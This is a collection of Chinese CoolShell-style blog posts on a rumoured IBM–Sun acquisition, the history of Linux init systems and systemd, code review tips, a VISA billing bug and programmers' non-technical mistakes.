而网上的博主们都在狂写评论文章了。有持支持态度的，这篇博文表明IBM和Sun都是喜欢开源（Linux 和OpenSolaris）以及跨平台的（Linux和Java）的，所以他们的合并可能更好的对抗微软和intel的x86平台，应该太有作为。还有这篇博文则对比了HP收购Compaq(DEC)的案例，说明这样的合并可能更为容易和HP对抗。当然，也有不认可以文章，比如ZNet上的这篇文章，作者觉得这根本就不可能，因为IBM和Sun有太多的重合了，很多方面都有存在很强的竞争，IBM要买来一点用都没有，要芯片技术吗？要操作系统吗？要数据库吗？要Java吗？更不可能。文中说，如果IBM想把Sun干掉，那么用65亿美金就太贵了，在这个寒冬，应该不用这种价格，除非这则新闻另有别的用意……不过，最有意思的评论是 **这篇**，简直是太精彩了，我忍不住想把之翻译在这里：——————————————————————————有报道说IBM准备使用至少65亿美金收购Sun Microsystems公司。如果这个交易发生的话，那么，难道这意味着 Solaris, SPARC, MySQL 和其它技术的会和IBM的核心产品重迭在一起？是否HP也会给Sun打个电话然后再给个价格呢？本人在此对于这个潜在的收购案给出四个预言。当然，Linux肯定是主宰了整个谈判。
基本上来说，本人并不是一个大型IT公司并购的Fans，因为你只要查看一下历史上的股票估价，你就会发现绝大多数的并购并不能像实际所说的那样。 (比如: Novell/WordPerfect, AT&T/NCR, AOL/Time Warner, Symantec/Veritas 等等).当然，本人要给IBM收购Sun的这种行为竖个大拇哥以示表扬。为什么？因为我们的Sun目前正生活在炼狱中，但是它却不可小视，因为这个公司有关很很的排列整齐的开源项目 (MySQL, open source storage 等) ，但是如果与 Sun的过时的生意(SPARC, Solaris, 等)比起来，这些只能为Sun带来硬币级利润的开源项目只能算个屁了。如果IBM真的收购了Sun，那么下面是我的四个预言：1. **长期停止Sun的基于RISC的 SPARC处理器。** IBM 本来就有了基于 RISC 技术的处理器( POWER 产品线)。让我们公正诚实地来看待这个问题，这些大的公司正在四周布满Intel服务器的环境下巩固他们的过气的RISC数据中心。我们不得不说，IBM的确干了一件相当出色的事情来长期地支援那些过气的硬件，而真实的研发 会出现一些POWER/SPARC 的结合变种以面对高端定位。   2. **Sun Solaris 必然会被混合到 IBM AIX中。** 这个世界有太多的Unix了，IBM找到了一个很有创意的方法取代于继续支持两个Unix，那就是把Solais和AIX所有的功能特性合并到一起。然后和HP-UX竞争，但最终可能的结果也许为成为Linux。这里，我希望大家不要在OpenSolris这里纠缠争论，因为本人强烈地怀疑IBM会把OpenSolaris直接做成Linux的另一选择。   3. **MySQL 是个大赢家。** 今天MySQL在东家Sun这里一看多了。MySQL在这些并购中的声望可以继续增涨，但是MySQL的职员可能会因此离开，而且MySQL内讧也会或多或少打击到开源数据。但有了强大的IBM Global Services 和 Big Blue 的销售渠道，MySQL 只会更加繁荣和兴旺。而且和DB2的联姻，IBM获得了一个强有力的组合拳（one-two punch） ，Oracle 和Microsoft SQL Server自然要被挨打。   4. **Linux。** 这是这个游戏中最大最大的赢家。不但可以在IBM自主的技术蓝图中和Sun的硬件和软件联合起来，而且可以向Linux的数据中心进军，甚至Linux的桌面系统可以加快速度。相信我，绝对没错的。
不但如此，IBM 收购Sun 还绝对说明了三件事： 1）合并了技术，2）合并了员工，3）控制了Sun的客户基础。Sun 用户不应该会恐慌，因为IBM拥有如此之强的实力会继续提供那些过气了的产品。实际上，Sun的用户只会在“如果IBM不收购Sun”时才会感到恐慌……好了，让我用一个思考性的问题来结束这个文章吧——到底是谁泄露IBM收购Sun的这个价格？为什么要泄露？难道是有人想要把HP也拉进来坐地起价？ 嘿嘿…# Linux PID 1 和 Systemd作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn要说清 Systemd，得先从Linux操作系统的启动说起。Linux 操作系统的启动首先从 BIOS 开始，然后由 Boot Loader 载入内核，并初始化内核。内核初始化的最后一步就是启动 init 进程。这个进程是系统的第一个进程，PID 为 1，又叫超级进程，也叫根进程。它负责产生其他所有用户进程。所有的进程都会被挂在这个进程下，如果这个进程退出了，那么所有的进程都被 kill 。如果一个子进程的父进程退了，那么这个子进程会被挂到 PID 1 下面。（注：PID 0 是内核的一部分，主要用于内进换页，参看：Process identifier）
目录* SysV Init   * UpStart   * Systemd   * Systemd 争论和八卦   * 其它   * 延伸阅读#### SysV InitPID 1 这个进程非常特殊，其主要就任务是把整个操作系统带入可操作的状态。比如：启动 UI – Shell 以便进行人机交互，或者进入 X 图形窗口。传统上，PID 1 和传统的 Unix System V 相兼容的，所以也叫 `sysvinit`，这是使用得最悠久的 init 实现。Unix System V 于1983年 release。在 `sysvint` 下，有好几个运行模式，又叫 `runlevel`。比如：常见的 3 级别指定启动到多用户的字符命令行界面，5 级别指定启起到图形界面，0 表示关机，6 表示重启。其配置在 `/etc/inittab` 文件中。与此配套的还有 `/etc/init.d/` 和 `/etc/rc[X].d`，前者存放各种进程的启停脚本（需要按照规范支持 `start`，`stop`子命令），后者的 X 表示不同的 runlevel 下相应的后台进程服务，如：`/etc/rc3.d` 是 runlevel=3 的。 里面的文件主要是 link 到 `/etc/init.d/` 里的启停脚本。其中也有一定的命名规范：S 或 K 打头的，后面跟一个数字，然后再跟一个自定义的名字，如：`S01rsyslog`，`S02ssh`。S 表示启动，K表示停止，数字表示执行的顺序。
#### UpStartUnix 和 Linux 在 `sysvint` 运作多年后，大约到了2006年的时候，Linux内核进入2.6时代，Linux有了很多更新。并且，Linux开始进入桌面系统，而桌面系统和服务器系统不一样的是，桌面系统面临频繁重启，而且，用户会非常频繁的使用硬件的热插拔技术。于是，这些新的场景，让 `sysvint` 受到了很多挑战。比如，打印机需要CUPS等服务进程，但是如果用户没有打机印，启动这个服务完全是一种浪费，而如果不启动，如果要用打印机了，就无法使用，因为`sysvint` 没有自动检测的机制，它只能一次性启动所有的服务。另外，还有网络盘挂载的问题。在 `/etc/fstab` 中，负责硬盘挂载，有时候还有网络硬盘（NFS 或 iSCSI）在其中，但是在桌面机上，有很可能开机的时候是没有网络的， 于是网络硬盘都不可以访问，也无法挂载，这会极大的影响启动速度。`sysvinit` 采用 `netdev` 的方式来解决这个问题，也就是说，需要用户自己在 `/etc/fstab` 中给相应的硬盘配置上 `netdev` 属性，于是 `sysvint` 启动时不会挂载它，只有在网络可用后，由专门的 `netfs` 服务进程来挂载。这种管理方式比较难以管理，也很容易让人掉坑。
所以，Ubuntu 开发人员在评估了当时几个可选的 init 系统后，决定重新设计这个系统，于是，这就是我们后面看到的 `upstart` 。 `upstart` 基于事件驱动的机制，把之前的完全串行的同步启动服务的方式改成了由事件驱动的异步的方式。比如：如果有U盘插入，`udev` 得到通知，`upstart` 感知到这个事件后触发相应的服务程序，比如挂载文件系统等等。因为使用一个事件驱动的玩法，所以，启动操作系统时，很多不必要的服务可以不用启动，而是等待通知，lazy 启动。而且事件驱动的好处是，可以并行启动服务，他们之间的依赖关系，由相应的事件通知完成。upstart 有着很不错的设计，其中最重要的两个概念是 Job 和 Event。**Job** 有一般的Job，也有service的Job，并且，`upstart` 管理了整个 Job 的生命周期，比如：Waiting, Starting, pre-Start, Spawned, post-Start, Running, pre-Stop, Stopping, Killed, post-Stop等等，并维护着这个生命周期的状态机。
**Event** 分成三类，`signal`, `method` 和 `hooks`。`signal` 就是异步消息，`method` 是同步阻塞的。`hooks` 也是同步的，但介于前面两者之间，发出hook事件的进程必须等到事件完成，但不检查是否成功。但是，`upstart` 的事件非常复杂，也非常纷乱，各种各样的事件（事件没有归好类）导致有点凌乱。不过因为整个事件驱动的设计比之前的 `sysvinit` 来说好太多，所以，也深得欢迎。#### Systemd直到2010的有一天，一个在 RedHat工作的工程师 Lennart Poettering 和 Kay Sievers ，开始引入了一个新的 `init` 系统—— `systemd`。这是一个非常非常有野心的项目，这个项目几乎改变了所有的东西，`systemd` 不但想取代已有的 init 系统，而且还想干更多的东西。Lennart 同意 `upstart` 干的不错，代码质量很好，基于事件的设计也很好。但是他觉得 `upstart` 也有问题，其中最大的问题还是不够快，虽然 `upstart` 用事件可以达到一定的启动并行度，但是，本质上来说，这些事件还是会让启动过程串行在一起。 如：`NetworkManager` 在等 `D-Bus` 的启动事件，而 `D-Bus` 在等 `syslog` 的启动事件。
Lennart 认为，实现上来说，`upstart` 其实是在管理一个逻辑上的服务依赖树，但是这个服务依赖树在表现形式上比较简单，你只需要配置——“启动 B好了就启动A”或是“停止了A后就停止B”这样的规则。但是，Lennart 说，这种简单其实是有害的（this simplification is actually detrimental）。他认为，* 从一个系统管理的角度出来，他一开始会设定好整个系统启动的服务依赖树，但是这个系统管理员要人肉的把这个本来就非常干净的服务依整树给翻译成计算机看的懂的 Event/Action 形式，而且 Event/Action 这种配置方式是运行时的，所以，你需要运行起来才知道是什么样的。* Event逻辑从头到脚到处都是，这个事件扩大了运维的复杂度，还不如之前的 `sysvint`。 也就是说，当用户配置了 “启动 `D-Bus` 后请启动 `NetworkManager`”， 这个 `upstart` 可以干，但是反过来，如果，用户启动 `NetworkManager`，我们应该先去启动他的前置依赖 `D-Bus`，然而你还要配置相应的反向 Event。本来，我只需要配置一条依赖的，结果现在我要配置很多很多情况下的Event。
* 最后，`upstart` 里的 Event 的并不标准，很混乱，没有良好的定义。比如：既有，进程启动，运行，停止的事件，也有USB设备插入、可用、拔出的事件，还有文件系统设备being mounted、 mounted 和 umounted 的事件，还有AC电源线连接和断开的事件。你会发现，这进程启停的、USB的、文件系统的、电源线的事件，看上去长得很像， 但是没有被标准化抽像出来掉，因为绝大多数的事件都是三元组：start, condition, stop 。这种概念设计模型并没有在 `upstart` 中出现。因为 `upstart` 被设计为单一的事件，而忽略了逻辑依赖。当然，如果 `systemd` 只是解决 `upstart` 的问题，他就改造 `upstart` 就好了，但是 Lennart 的野心不只是想干个这样的事，他想干的更多。首先，`systemd` 清醒的认识到了 init 进程的首要目标是要让用户快速的进入可以操作OS的环境，所以，这个速度一定要快，越快越好，所以，`systemd` 的设计理念就是两条：* To start **less**.   * And to start **more** in _parallel_.
也就是说，按需启动，能不启动就不启动，如果要启动，能并行启动就并行启动，包括你们之间有依赖，我也并行启动。按需启动还好理解，那么，有依赖关系的并行启动，它是怎么做到的？这里，`systemd` 借鉴了 MacOS 的 `Launchd` 的玩法（在Youtube上有一个分享——Launchd: One Program to Rule them All，在苹果的开源网站上也有相关的设计文档——About Daemons and Services）要解决这些依赖性，systemd 需要解决好三种底层依赖—— Socket， D-Bus ，文件系统。* **Socket依赖** 。如果服务C依赖于服务S的socket，那么就要先启动S，然后再启动C，因为如果C启动时找不到S的Socket，那么C就会失败。`systemd` 可以帮你在S还没有启动好的时候，建立一个socket，用来接收所有的C的请求和数据，并缓存之，一旦S全部启动完成，把systemd替换好的这个缓存的数据和Socket描述符替换过去。* **D-Bus依赖** 。`D-Bus` 全称 Desktop Bus，是一个用来在进程间通信的服务。除了用于用户态进程和内核态进程通信，也用于用户态的进程之前。现在，很多的现在的服务进程都用 `D-Bus` 而不是Socket来通信。比如：`NetworkManager` 就是通过 `D-Bus` 和其它服务进程通讯的，也就是说，如果一个进程需要知道网络的状态，那么就必需要通过 `D-Bus` 通信。`D-Bus` 支持 “Bus Activation”的特性。也就是说，A要通过 `D-Bus` 服务和B通讯，但是B没有启动，那么 `D-Bus` 可以把B起来，在B启动的过程中，`D-Bus` 帮你缓存数据。`systemd` 可以帮你利用好这个特性来并行启动 A 和 B。
* **文件系统依赖** 。系统启动过程中，文件系统相关的活动是最耗时的，比如挂载文件系统，对文件系统进行磁盘检查（fsck），磁盘配额检查等都是非常耗时的操作。在等待这些工作完成的同时，系统处于空闲状态。那些想使用文件系统的服务似乎必须等待文件系统初始化完成才可以启动。`systemd` 参考了 `autofs` 的设计思路，使得依赖文件系统的服务和文件系统本身初始化两者可以并发工作。`autofs` 可以监测到某个文件系统挂载点真正被访问到的时候才触发挂载操作，这是通过内核 `automounter` 模块的支持而实现的。比如一个 `open()` 系统调用作用在某个文件系统上的时候，而这个文件系统尚未执行挂载，此时 `open()` 调用被内核挂起等待，等到挂载完成后，控制权返回给 `open()` 系统调用，并正常打开文件。这个过程和 `autofs` 是相似的。下图来自 Lennart 的演讲里的一页PPT，展示了不同 init 系统的启动。除此之外，systemd 还在启动时管理好了一些下面的事。用C语言取代传统的脚本式的启动。前面说过，`sysvint` 用 `/etc/rcX.d` 下的各种脚本启动。然而这些脚本中需要使用 `awk`, `sed`, `grep`, `find`, `xargs` 等等这些操作系统的命令，这些命令需要生成进程，生成进程的开销很大，关键是生成完这些进程后，这个进程就干了点屁大的事就退了。换句话说就是，我操作系统干了那么多事为你拉个进程起来，结果你就把个字串转成小写就退了，把我操作系统当什么了？
在正常的一个 `sysvinit` 的脚本里，可能会有成百上千个这样的命令。所以，慢死。因此，`systemd` 全面用 C 语言全部取代了。一般来说，`sysvinit` 下，操作系统启动完成后，用 `echo $$` 可以看到，pid 被分配到了上千的样子，而 `systemd` 的系统只是上百。另外，systemd 是真正一个可以管住服务进程的——可以跟踪上服务进程所fork/exec出来的所有进程。* 我们知道， 传统 Unix/Linux 的 Daemon 服务进程的最佳实践基本上是这个样子的 （具体过程可参看这篇文章“SysV Daemon”）——      1. 进程启动时，关闭所有的打开的文件描述符（除了标准描述符0,1,2），然后重置所有的信号处理。     2. 调用 `fork()` 创建子进程，在子进程中 `setsid()`，然后父进程退出（为了后台执行）     3. 在子进程中，再调用一次 `fork()`，创建孙子进程，确定没有交互终端。然后子进程退出。     4. 在孙子进程中，把标准输入标准输出标准错误都连到 `/dev/null` 上，还要创建 pid 文件，日志文件，处理相关信号 ……     5. 最后才是真正开始提供服务。
* 在上面的这个过程中，服务进程除了两次 `fork` 外还会 `fork` 出很多很多的子进程（比如说一些Web服务进程，会根据用户的请求链接来 `fork` 子进程），这个进程树是相当难以管理的，因为，一旦父进程退出来了，子进程就会被挂到 PID 1下，所以，基本上来说，你无法通过服务进程自已给定的一个pid文件来找到所有的相关进程（这个对开发者的要求太高了），所以，在传统的方式下用脚本启停服务是相当相当的 Buggy 的，因为无法做对所有的服务生出来的子子孙孙做到监控。* 为了解决这个问题，`upstart` 通过变态的 `strace` 来跟踪进程中的 `fork()` 和 `exec()` 或 `exit()` 等相关的系统调用。这种方法相当笨拙。 `systemd` 使用了一个非常有意思的玩法来 tracking 服务进程生出来的所有进程，那就是用 `cgroup` （我在 Docker 的基础技术“cgroup篇”中讲过这个东西）。cgroup主要是用来管理进程组资源配额的事，所以，无论服务如何启动新的子进程，所有的这些相关进程都会同属于一个 `cgroup`，所以，`systemd` 只需要简单的去遍历一下相应的 `cgroup` 的那个虚文件系统目录下的文件，就可以正确的找到所有的相关进程，并将他们一一停止。
另外，`systemd` 简化了整个 daemon 开发的过程：* 不需要两次 `fork()`，只需要实现服务本身的主逻辑就可以了。   * 不需要 `setsid()`，`systemd` 会帮你干   * 不需要维护 `pid文件`，`systemd` 会帮处理。   * 不需要管理日志文件或是使用`syslog`，或是处理`HUP`的日志reload信号。把日志打到 `stderr` 上，`systemd` 帮你管理。   * 处理 `SIGTERM` 信号，这个信号就是正确退出当前服务，不要做其他的事。   * ……除此之外，`systemd` 还能——* 自动检测启动的服务间有没有环形依赖。   * 内建 autofs 自动挂载管理功能。   * 日志服务。`systemd` 改造了传统的 syslog 的问题，采用二进制格式保存日志，日志索引更快。   * 快照和恢复。对当前的系统运行的服务集合做快照，并可以恢复。   * ……还有好多好多，他接管很多很多东西，于是就让很多人不爽了，因为他在干了很多本不属于 PID 1 的事。#### Systemd 争论和八卦于是 `systemd` 这个东西成了可能是有史以来口水战最多的一个开源软件了。`systemd` 饱受各种争议，最大的争议就是他破坏了 Unix 的设计哲学（相关的哲学可以读一下《Unix编程艺术》），干了一个大而全而且相当复杂的东西。当然，Lennart 并不同意这样的说法，他后来又写一篇blog “The Biggest Myths”来解释 `systemd` 并不是这样的，大家可以前往一读。
这个争议大到什么样子呢？2014 年，Debian Linux 因为想准备使用 `systemd` 来作为标准的 init 守护进程来替换 `sysvinit` 。而围绕这个事的争论达到了空前的热度，争论中充满着仇恨，`systemd` 的支持者和反对者都在互相辱骂，导致当时 Debian 阵营开始分裂。还有人给 Lennart 发了死亡威胁的邮件，用比特币雇凶买杀手，扬言要取他的性命，在Youbute上传了侮辱他的歌曲，在IRC和各种社交渠道上给他发下流和侮辱性的消息。这已经不是争议了，而是一种不折不扣的仇恨！于是，Lennart 在 Google Plus 上发了贴子，批评整个 Linux 开源社区和 Linus 本人。他大意说，> 这个社区太病态了，全是 ass > holes，你们不停用各种手段在各种地方用不同的语言和方式来侮辱和漫骂我。我还是一个年轻人，我从来没有经历过这样的场面，但是今天我已经对这种场面很熟悉了。我有时候说话可能不准确，但是我不会像他样那样说出那样的话，我也没有被这些事影响，因为我脸皮够厚，所以，为什么我可以在如何大的反对声面前让 > `systemd` 成功，但是，你们 Linux 社区太可怕了。你们里面的有精神病的人太多了。另外，对于Linus Torvalds，你是这个社区的 > Role Model，但可惜你是一个 Bad Role > Model，你在社区里的刻薄和侮辱性的言行，基本从一定程度上鼓励了其它人跟你一样，当然，并不只是你一个人的问题，而是在你周围聚集了一群和你一样的这样干的人。送你一句话—— > A fish rots from the head down ！一条鱼是从头往下腐烂的……
这篇契文很长，喜欢八卦的同学可以前往一读。感受一下 Lennart 当时的心态（我觉得能算上是非常平稳了）。Linus也在被一媒体问起 `systemd` 这个事来（参看“Torvalds says he has no strong opinions on systemd”），Linus在采访里说，> 我对 `systemd` 和 Lennart 的贴子没有什么强烈的想法。虽然，传统的 Unix 设计哲学—— “Do one thing and Do > it well”，很不错，而且我们大多数人也实践了这么多年，但是这并不代表所有的真实世界。在历史上，也不只有`systemd` > 这么干过。但是，我个人还是 old-fashioned 的人，至少我喜欢文本式的日志，而不是二进制的日志。但是 `systemd` > 没有必要一定要有这样的品味。哦，我说细节了……今天，`systemd` 占据了几乎所有的主流的 Linux 发行版的默认配置，包括：Arch Linux、CentOS、CoreOS、Debian、Fedora、Megeia、OpenSUSE、RHEL、SUSE企业版和 Ubuntu。而且，对于 CentOS, CoreOS, Fedora, RHEL, SUSE这些发行版来说，不能没有 `systemd`。（Ubuntu 还有一个不错的wiki – Systemd for Upstart Users 阐述了如何在两者间切换）
#### 其它还记得在《缓存更新的套路》一文中，我说过， **如果你要做好架构，首先你得把计算机体系结构以及很多老古董的基础技术吃透了** 。因为里面会有很多可以借鉴和相通的东西。那么，你是否从这篇文章里看到了一些有分布式架构相似的东西？比如：从 `sysvinit` 到 `upstart` 再到 `systemd`，像不像是服务治理？Linux系统下的这些服务进程，是不是很像分布式架构中的微服务？还有那个D-Bus，是不是很像SOA里的ESB？而 init 系统是不是很像一个控制系统？甚至像一个服务编排（Service Orchestration）系统？分布式系统中的服务之间也有很多依赖，所以，在启动一个架构的时候，如果我们可以做到像 systemd 那样并行启动的话，那么是不是就像是一个微服务的玩法了？嗯，你会发现，技术上的很多东西是相通的，也是互相有对方的影子，所以，其实技术并不多。关键是我们学在了表面还是看到了本质。#### 延伸阅读* Lennert 的博文：Rethinking PID 1   * Lennert 的演讲：systemd, beyond init （ PPT ）   * Wikipedia：Systemd   * LinuxVoice：Lennart Poettering 专访
（全文完）# Code Review中的几个提示作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!Code ReivewCode Review应该是软件工程最最有价值的一个活动，之前，本站发表过《简单实用的Code Review工具》，那些工具主要是用来帮助更有效地进行这个活动，这里的这篇文章，我们主要想和大家分享一下Code Review代码审查的一些心得。首先，我们先来看看Code Reivew的用处：1. Code reviews 中，可以通过大家的建议增进代码的质量。   2. Code reviews 是一个传递知识的手段，可以让其它并不熟悉代码的人知道作者的意图和想法，从而可以在以后轻松维护代码。   3. Code reviews 也鼓励程序员们相互学习对方的长处和优点。   4. Code reviews 也可以被用来确认自己的设计和实现是一个清楚和简单的。你也许注意到了在上面的Code Reivew中的诸多用处中，我们没有提到可以帮助找到程序的bug和保证代码风格和编码标准。这是因为我们认为：1. **Code reviews 不应该承担发现代码错误的职责**。Code Review主要是审核代码的质量，如可读性，可维护性，以及程序的逻辑和对需求和设计的实现。代码中的bug和错误应该由单元测试，功能测试，性能测试，回归测试来保证的（其中主要是单元测试，因为那是最接近Bug，也是Bug没有扩散的地方）   2. **Code reviews 不应该成为保证代码风格和编码标准的手段**。编码风格和代码规范都属于死的东西，每个程序员在把自己的代码提交团队Review的时候，代码就应该是符合规范的，这是默认值，属于每个人自己的事情，不应该交由团队来完成，否则只会浪费大家本来就不够的时间。我个人认为“meeting”是奢侈的，因为那需要大家在同一时刻都挤出时间，所以应该用在最需要的地方。代码规范比起程序的逻辑和对需求设计的实现来说，太不值得让大家都来了。
10年前，上面这两件事会是理所当然的（10年前的中国的软件开发还没有Code Reivew呢），今天，在中国的很多公司上面这两件事依然被认为是Code Reivew最重要的事，所以，我能够看到很多开发Team抱怨Code Review就是一个形式，费时费力不说，发现的问题还不如测试，而评审者们除了在代码风格上有些见术，别的也就没什么用了，长而久之，大家都会开始厌烦这个事了。所以，在今天，请不要把上面的那两件事分散了Code Review的注意力，取而代之的是，对于Bug，程序的作者要在Review前提交自己的单元测试报告（如：XUnit的测试结果），对于代码规范，这是程序作者自己需要保证的，而且，有一些工具是可以帮你来检查代码规范的。**当然，上述这些言论并不是说，你不能在Code Review中报告一个程序的bug或是一个代码规范的问题。我只是说，那并不是Code Review的意图。**下面是我们认为的几个小提示可以让你更好进行Code Review这项最有价值的活动。目录* 1.- 经常进行Code Review   * 2.- Code Review不要太正式，而且要短   * 3.- 尽可能的让不同的人Reivew你的代码   * 4.- 保持积极的正面的态度   * 5.- 学会享受Code Reivew
#### 1.- 经常进行Code Review以前经历过几个相当痛苦的Code Review，那几次Code Review都是在程序完成的时候进行的，当你面对那近万行的代码，以前N多掺和在一起的功能，你会发现，整个Code Review变得非常地艰难，用不了一会儿，你就会发现大家都在拼命地打着哈欠，但还是要坚持，有时候，这样的Review会持续3个小时以上，相当的夸张。而且，会议上会出现相当多的问题和争论，因为，这就好像，人家都把整个房子盖好了，大家Review时这挑一点那挑一点，有时候触动地基或是承重墙体，需要大动手术，让人返工，这当然会让盖房的人一下就跳起来极力地维护自己的代码，最后还伤了团队成员的感情。所以，千万不要等大厦都盖好了再去Reivew，而且当有了地基，有了框架，有了房顶，有了门窗，有了装修，的各个时候循序渐进地进行Review，这样反而会更有效率，也更有帮助。下面是一些观点，千万要铭记：* **要Review的代码越多，那么要重构，重写的代码就会越多。而越不被程序作者接受的建议也会越多，唾沫口水战也会越多。   *** **程序员代码写得时候越长，程序员就会在代码中加入越来越多的个人的东西。** 程序员最大的问题就是“自负”，无论什么时候，什么情况下，有太多的机会会让这种“自负”澎涨开来，并开始影响团队影响整个项目，以至于听不见别人的建议，从而让Code Review变成了口水战。   * **越接近软件发布的最终期限，代码也就不能改得太多。**
我个人的习惯，并且也是对团队成员的要求是——先Review设计实现思路，然后Review设计模式，接着Review成形的骨干代码，最后Review完成的代码，如果程序复杂的话，需要拆成几个单元或模块分别Review。当然，最佳的practice是，每次Review的代码应该在1000行以内，时间不能超过一部电影的时间——1.5小时（因为据说那个一个正常人的膀胱可以容纳尿液的最长限度）当然，在敏捷开发中，他们不需要Code Reivew，其实，敏捷开发中使用更为极端的“结对编程”（Pair-Programming）的方法 —— 一种时时刻刻都在进行Code Review的方法，个人感觉在实际过程中，这种方法有点过了。另外，大家可以看看本站的另一篇文章《结对编程的利与弊》来了解一下这种方法的问题。#### 2.- Code Review不要太正式，而且要短忘了那个代码评审的Checklist吧，走到你的同事座位跟前，像请师父一样请他坐到你的电脑面前，然后，花5分钟给他讲讲你的代码，给他另外一个5分钟让他给你的代码提提意见，这比什么都好。而如果你用了一个Checklist，让这个事情表现得很正式的话，下面两件事中必有一件事会发生：
1. 只有在Checklist上存在的东西才会被Review。   2. Code Reviews 变成了一种礼节性的东西，你的同事会装做很关心你的代码，但其实他心里想着尽快地离开你。只有不正式的Code Review才会让你和评审者放轻松，人只有放松了，才会表现得很真实，很真诚。记住Review只不过是一种形式，而只有在相互信任中通过相互的讨论得到了有意义和有建设性的建议和意见，那才是最实在的。不然，作者和评审者的关系就会变成小偷和警察的关系。#### 3.- 尽可能的让不同的人Reivew你的代码这是一个好主意，如果可能的话，不要总是只找一个人来Review你的代码，不同的人有不同的思考方式，有不同的见解，所以，不同的人可以全面的从各个方面评论你的代码，有的从实现的角度，有的从需求的角度，有的从用户使用的角度，有的从算法的角度，有的从性能效率的角度，有的从易读的角度，有的从扩展性的角度……，啊，好多啊，还让不让人活了。不管怎么说，多找一些不同的人会对你很有好处。当然，不要太多了，人多嘴杂反而适得其反，基本上来说，不要超过3个人，这是因为，这是一个可以围在一起讨论的最大人员尺寸。下面是几个优点：
1. 从不同的方向评审代码总是好的。   2. 会有更多的人帮你在日后维护你的代码。   3. 这也是一个增加团队凝聚力的方法。#### 4.- 保持积极的正面的态度再说一次，程序最大的问题就是“自负”，尤其当我们Reivew别人的代码的时候，我已经见过无数的场面，程序员在Code Review的时候，开始抨击别人的代码，质疑别人的能力。太可笑了，我分析了一下，这类的程序员其实并没有什么本事，因为他们指责对方的目的是想告诉大家自己有多么的牛，靠这种手段来表现自己的程序员，其实是就是传说中所说的“半瓶水”。所以，无论是代码作者，还是评审者，都需要一种积极向上的正面的态度，作者需要能够虚心接受别人的建议，因为别人的建议是为了让你做得更好；评审者也需要以一种积极的正面的态度向作者提意见，因为那是和你在一个战壕里的战友。记住，你不是一段代码，你是一个人！#### 5.- 学会享受Code Reivew这可能是最重要的一个提示了，如果你到了一个人人都喜欢Code Reivew的团阿，那么，你会进入到一个生机勃勃的地方，在那里，每个人都能写出质量非常好的代码，在那里，你不需要经理的管理，团队会自适应一切变化，他们相互学习，相互帮助，不仅仅是写出好的代码，而且团队和其中的每个人都会自动进化，最关键的是，这个是一个团队。
（全文完）# 23,148,855,308,184,500作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn上个月VISA信用卡出事了，某个美国人在加油站买了一包香烟，于是他的信用卡里就有了标题那个数字的钱“$23,148,855,308,184,500”，注意这可以美刀啊，相当于美国整个国家国债的N倍。程序员们开始疯狂了，他们在stackoverflow.com上开始人肉debug这个问题（贴子）。排名第一的回答（564 votes）说，这个数字转成十六进制是：0x2020 2020 2020 1250，很明显，前面的若干个0X20表示的是空格，也就是说，程序错误地处理了空格。于是本回答后的跟贴把这个回答推举成了本年度最牛的debug——”best debug of the year”，后面还有人说这个人应该在NASA工作，继而有人跟贴，应该是VISA而不是NASA……当然，也有人有不同的意见……排名第二个贴子(仅有排名第一的零头 67 votes)发表了不同的意见，贴主说，VISA报道说当时全球在那个星期内发生了大约13000起这样的事情，而且，全世界在报道相似的事情（报道一，报道二），但所有的报道都是相同的数字——23,148,855,308,184,500。如果前面是空格，那么最后的一个字节是，0x1250怎么可能会是一样的呢？所以，他并不认为空格被解释了，他觉得一定是某个地方出错了，并不像一楼所说的那么简单。
!Josh Muszynski’s Statement!Jason Bryant’s Statement!Ron Seale!Teenage Girl   !Elizabeth Lewis为什么说这个事呢？主要有两个目的：* 其一、软件总是会有很多Bug要我们去debug，bug的症状并不代表着那就是Bug的原因，但通过Bug的症状推理出Bug的原因，有时候真是很像一个侦探要做的事情，从上面的这个故事中，我们可以看出这样的能力的重要性。要有这样的推理能力，需要有很强的基础知识，以及丰富的经验。   * 其二、StackOverflow.com是一个很不错的类似于“百度知道”但要比其好N倍的与编程相关的站点，相当的不错，你会经常光顾这个站点吗？最后，大家可以看看这个贴子后面的一些人的相法，各种说法都有，包括一个灌水的，来轻松一下：That’s the exact amount I intend leaving to my children after I’m dead.呵呵。（全文完）# 程序员犯的非技术错误(Top 5)作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
对于程序开发者来说，有两种技术需要我们掌握，一个是技术上的能力，另一个是非技术上的能力。不幸的是，许多程序员过多地关注了技术上的能力，而忽略了非技术上的能力的培养，因此，我们的程序员们经常会有一些很不好的习惯，这里我们例举了程序员们最常犯的5个非技术的错误，与大家共勉。目录* 1.- 缺乏团队纪律   * 2.- 过度自负   * 3.- 沟通不畅   * 4.- 忘了用户   * 5.- 不懂工作的轻重缓急#### 1.- 缺乏团队纪律“Discipline is the bridge between goals and accomplishment.” Jim Rohn.纪律是一个最有价值的技能，不仅仅只是在软件开发领域，同样在其它领域也是一样的。但对于现实来说，我们很难找到即有才华又有纪律的人。这正如足球队一样，非洲的球员们才华相当的出众，可惜他们总是独自为阵，团队纪律性不足，所以可以有好的成绩，但却无法赢得最后的胜利；而德国队的队员个人技能平平，但其有很强大的团队纪律性，所以，总是能打入最后的决赛并获得冠军。有人说过，个人英雄并不可怕，而有强大纪律性的团队才让人可怕。这正是日本这个民族的可怕之处。况且，软件开发从来都不是一个人可以完成的事情，所以团队工作中的纪律性会是非常重要的。
Steve Pavlina 强调了自律中5个因素：“ **承担** , **毅力** , **努力** , **勤奋** , 和 **坚持** _。_ ” 这里，我们强烈推荐你读一读Steve的 关于自律的文章。下面是我们觉得程序应该有的比较良好的习惯。* 每天都有自己的to do list   * 在一个时间内只做一个事   * 把事情做对了   * 事情没有完全完成时不要轻易结束   * 慢点总比道歉好，道歉总比不做好#### 2.- 过度自负我们的经验告诉我们，过度的自负的人一般是意识不到自己的自负，下面是一些过度自负的特征，希望你可以从中检测一下自己是否过度自负了。* 觉得自己是最牛的程序员   * 总是打断谈话   * 你要求Code Reivew不是要检查代码，而是向大家炫耀你的代码在网上有太多的文章关于程序员的自负的问题，这里有两篇，你可以看看：一篇是Mike Bernat的 Egoless programming（无自负编程） 还有一个是stackoverflow.com 上的一个贴子。#### 3.- 沟通不畅“如果我要说十分钟，我需要一周做准备；如果说15分钟，我需要3天做准备；半个小时，我需要两天；如果说一个小时，我现在就准备好了。” Woodrow Wilson
